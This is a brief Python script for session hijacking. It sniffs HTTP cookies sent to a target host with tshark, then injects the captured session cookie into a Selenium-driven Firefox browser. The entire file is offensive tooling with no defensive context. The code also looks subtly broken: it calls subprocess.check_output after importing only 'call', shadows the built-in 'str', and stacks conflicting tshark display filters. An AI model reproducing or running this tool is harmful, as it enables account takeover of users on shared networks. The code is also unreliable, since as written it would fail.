import sys
from subprocess import call
import selenium.webdriver

if ( len(sys.argv) < 3):
    sys.exit()

# read cookie and store session name && id && request uri

target = sys.argv[1]
str = (subprocess.check_output(["tshark", "-a",
                                "duration:" + sys.argv[2],
                                "-T", "fields",
                                "-e", "http.cookie",
                                "-e", "http.request.uri",
                                "-Y", "http.cookie",
                                "-Y" ,"http.host contains " + target])).decode("utf-8")
multi_str = str.splitlines()
session_str = multi_str[0].split("\t")[0]
uri_str = multi_str[0].split("\t")[1]

spl_list = session_str.split("=")
if (len(spl_list) < 2):
    sys.exit()
session_name = spl_list[0]
session_val = spl_list[1]

# inject session id

driver = selenium.webdriver.Firefox()
driver.get("http://www." + target)
driver.add_cookie({'name':session_name, 'value':session_val, 'path':uri_str})
for cookie in driver.get_cookies():
    print ((cookie['name'], cookie['value']))
